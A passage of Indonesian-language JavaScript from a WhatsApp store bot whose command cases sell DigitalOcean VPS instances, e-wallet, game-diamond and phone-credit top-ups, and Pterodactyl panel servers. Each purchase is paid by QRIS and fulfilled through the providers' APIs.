 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Vps Digital Ocean
`}, {quoted: db.users[m.sender].saweria.msg})
var orang = db.users[m.sender].saweria.chat
    let hostname = "#" + m.sender.split("@")[0]
    
    try {        
        let dropletData = {
            name: hostname,
            region: "sgp1", 
            size: Obj.images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await Xuu.sendMessage(orang, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
await Xuu.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "topupsaldo": {
if (m.isGroup) return reply("Pembelian saldo dana hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!args[0]) return reply(example("085XXX"))
if (!args[0].startsWith("08")) return reply(example("085XXX"))
if (!args[1] || !args[1].split("|")) {
let nodana = args[0].trim()
const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
        let dana = data.filter(item => /Top Up Saldo GO-JEK/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana1 = data.filter(item => /Top Up Saldo DANA/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        dana = [...dana1, ...dana]

        let sections = dana.map((item) => {
            const status = item.status === "1" ? "✅" : "❌";
            return {
                title: `${item.keterangan}`,
                description: `Rp${item.harga}`, 
                id: `.topupsaldo ${nodana} ${item.kode}|${item.harga}|${item.keterangan}`
            };
})
return Xuu.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Jumlah',
          sections: [
            {
              title: 'List Nominal Topup Saldo',
              highlight_label: 'Recommended',
              rows: sections             
            }
          ]
        })
      }
      }
  ],
  footer: `© AXONIC V10`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Jumlah Topup Saldo\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
let Obj = {}
Obj.harga = args[1].split("|")[1]
Obj.nominal = args[1].split("|")[2]
Obj.kode = args[1].split("|")[0]
Obj.nodana = args[0].trim()
const UrlQr = global.qrisOrderKuota
const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`https://payment-xuu.vercel.app/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)

const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.data.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.data.amount)}
 *• Barang :* ${Obj.nominal}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`
let msgQr = await Xuu.sendMessage(m.chat, {
  footer: `Powered By XuuDev`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.data.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
});
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
keterangan: Obj.nominal, 
chat: m.sender,
idDeposit: get.data.data.transactionId, 
amount: get.data.data.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await Xuu.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Xuu.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://payment-xuu.vercel.app/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Xuu.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.nominal}
`}, {quoted: db.users[m.sender].saweria.msg})
const idtrx = "ZarR Store" + `${Date.now()}`
await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {
let dt = await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await Xuu.sendMessage(db.users[m.sender].saweria.chat, {text: `
*Topup ${db.users[m.sender].saweria.keterangan} Berhasil ✅*

 *• Nomor Tujuan :* ${Obj.nodana}
 *• Status :* Sukses
`}, {quoted: db.users[m.sender].saweria.msg})
statuse = false
break
}
await sleep(5000)
}
await Xuu.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "topupdiamond": {
if (m.isGroup) return reply("Pembelian saldo dana hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!args[0] || !args[0].split("|")) return reply(example("id|serverid"))
if (!args[1] || !args[1].split("|")) {
let nodana = args[0].split("|")[0]
let serverid = args[0].split("|")[1]
const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
        let dana = data.filter(item => /TPG Diamond Mobile Legends/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana1 = data.filter(item => /TPG Diamond Free Fire/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana2 = data.filter(item => /TPG Game Mobile PUBG/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana3 = data.filter(item => /TPG Stumble Guys/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        dana = [...dana1, ...dana, ...dana2, ...dana3]

        let sections = dana.map((item) => {
            const status = item.status === "1" ? "✅" : "❌";
            return {
                title: `${item.keterangan}`,
                description: `Rp${item.harga}`, 
                id: `.topupdiamond ${nodana}|${serverid} ${item.kode}|${item.harga}|${item.keterangan}`
            };
})
return Xuu.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Jumlah',
          sections: [
            {
              title: 'List Layanan Topup Diamond',
              highlight_label: 'Recommended',
              rows: sections             
            }
          ]
        })
      }
      }
  ],
  footer: `© AXONIC V10`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Jumlah Topup Diamond\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
let Obj = {}
Obj.harga = args[1].split("|")[1]
Obj.nominal = args[1].split("|")[2]
Obj.kode = args[1].split("|")[0]
Obj.id = args[0].split("|")[0]
Obj.serverid = args[0].split("|")[1]
Obj.nodana = Obj.id + Obj.serverid
const UrlQr = global.qrisOrderKuota
const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`https://payment-xuu.vercel.app/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)

const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.data.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.data.amount)}
 *• Barang :* ${Obj.nominal}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`
let msgQr = await Xuu.sendMessage(m.chat, {
  footer: `Powered By XuuDev`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.data.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
});
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
keterangan: Obj.nominal, 
chat: m.sender,
idDeposit: get.data.data.transactionId, 
amount: get.data.data.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await Xuu.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Xuu.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://payment-xuu.vercel.app/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Xuu.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.nominal}
`}, {quoted: db.users[m.sender].saweria.msg})
const idtrx = "ZarStore" + `${Date.now()}`
await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {
let dt = await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await Xuu.sendMessage(db.users[m.sender].saweria.chat, {text: `
*Topup ${db.users[m.sender].saweria.keterangan} Berhasil ✅*

 *• Nomor Tujuan :* ${Obj.nodana}
 *• Status :* Sukses
`}, {quoted: db.users[m.sender].saweria.msg})
statuse = false
break
}
await sleep(5000)
}
await Xuu.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "isipulsa": {
if (m.isGroup) return reply("Pembelian saldo dana hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!args[0]) return reply(example("085XXX"))
if (!args[0].startsWith("08")) return reply(example("085XXX"))
if (!args[1] || !args[1].split("|")) {
let nodana = args[0].trim()
const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
        let dana = data.filter(item => /Axis Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana0 = data.filter(item => /Telkomsel Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana1 = data.filter(item => /Smartfren Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana2 = data.filter(item => /Three Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana3 = data.filter(item => /XL Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);   
 dana = [...dana, ...dana0, ...dana1, ...dana2, ...dana3]

        let sections = dana.map((item) => {
            const status = item.status === "1" ? "✅" : "❌";
            return {
                title: `${item.keterangan}`,
                description: `Rp${item.harga}`, 
                id: `.isipulsa ${nodana} ${item.kode}|${item.harga}|${item.keterangan}`
            };
})
return Xuu.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Jumlah',
          sections: [
            {
              title: 'List Layanan Isi Pulsa',
              highlight_label: 'Recommended',
              rows: sections             
            }
          ]
        })
      }
      }
  ],
  footer: `© AXONIC V10`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Nominal Isi Pulsa\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
let Obj = {}
Obj.harga = args[1].split("|")[1]
Obj.nominal = args[1].split("|")[2]
Obj.kode = args[1].split("|")[0]
Obj.nodana = args[0].trim()
const UrlQr = global.qrisOrderKuota
const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`https://payment-xuu.vercel.app/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)

const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.data.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.data.amount)}
 *• Barang :* ${Obj.nominal}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`
let msgQr = await Xuu.sendMessage(m.chat, {
  footer: `Powered By XuuDev`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.data.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
});
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
keterangan: Obj.nominal, 
chat: m.sender,
idDeposit: get.data.data.transactionId, 
amount: get.data.data.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await Xuu.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Xuu.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://payment-xuu.vercel.app/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Xuu.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.nominal}
`}, {quoted: db.users[m.sender].saweria.msg})
const idtrx = "ZarStore" + `${Date.now()}`
await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {
let dt = await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await Xuu.sendMessage(db.users[m.sender].saweria.chat, {text: `
*Topup ${db.users[m.sender].saweria.keterangan} Berhasil ✅*

 *• Nomor Tujuan :* ${Obj.nodana}
 *• Status :* Sukses
`}, {quoted: db.users[m.sender].saweria.msg})
statuse = false
break
}
await sleep(5000)
}
await Xuu.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "buypanel": {
if (m.isGroup) return reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return Xuu.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Ram Panel',
          sections: [
            {
              title: 'List Ram Server Panel',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram Unlimited', 
                  description: "Rp11.000", 
                  id: '.buypanel unlimited'
                },
                {
                  title: 'Ram 1GB', 
                  description: "Rp1000", 
                  id: '.buypanel 1gb'
                },
                {
                  title: 'Ram 2GB', 
                  description: "Rp2000", 
                  id: '.buypanel 2gb'
                },
                {
                  title: 'Ram 3GB', 
                  description: "Rp3000", 
                  id: '.buypanel 3gb'
                },
                {
                  title: 'Ram 4GB', 
                  description: "Rp4000", 
                  id: '.buypanel 4gb'
                },      
                {
                  title: 'Ram 5GB', 
                  description: "Rp5000", 
                  id: '.buypanel 5gb'
                },       
                {
                  title: 'Ram 6GB', 
                  description: "Rp6000", 
                  id: '.buypanel 6gb'
                },
                {
                  title: 'Ram 7GB', 
                  description: "Rp7000", 
                  id: '.buypanel 7gb'
                },        
                {
                  title: 'Ram 8GB', 
                  description: "Rp8000", 
                  id: '.buypanel 8gb'
                },   
                {
                  title: 'Ram 9GB', 
                  description: "Rp9000", 
                  id: '.buypanel 9gb'
                },       
                {
                  title: 'Ram 10GB', 
                  description: "Rp10.000", 
                  id: '.buypanel 10gb'
                },                                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© AXONIC V10`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Panel Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "1000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "1000"
Obj.cpu = "60"
Obj.harga = "2000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "2000"
Obj.cpu = "80"
Obj.harga = "3000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "2000"
Obj.cpu = "100"
Obj.harga = "4000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "3000"
Obj.cpu = "120"
Obj.harga = "5000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "3000"
Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "4000"
Obj.cpu = "160"
Obj.harga = "7000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "4000"
Obj.cpu = "180"
Obj.harga = "8000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "5000"
Obj.cpu = "200"
Obj.harga = "9000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "5000"
Obj.cpu = "220"
Obj.harga = "10000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "11000"
} else return m.reply(teks)

const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`https://payment-xuu.vercel.app/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)

const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.data.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.data.amount)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`
let msgQr = await Xuu.sendMessage(m.chat, {
  footer: `Powered By XuuDev`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.data.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
});
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.data.transactionId, 
amount: get.data.data.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await Xuu.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Xuu.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://payment-xuu.vercel.app/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Xuu.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}
*🗓️ Created :* ${user.created_at.split("T")[0]}

*🌐 Spesifikasi Server*
* Ram : *${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}*
* Disk : *${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}*
* CPU : *${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("./akunpanel.txt", tekspanel)
await Xuu.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: tekspanel}, {quoted: null})
await fs.unlinkSync("./akunpanel.txt")
await Xuu.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "buyadp": {
if (m.isGroup) return reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = "20000" 
Obj.username = us
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://payment-xuu.vercel.app/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.data.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.data.amount)}
 *• Barang :* Admin Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
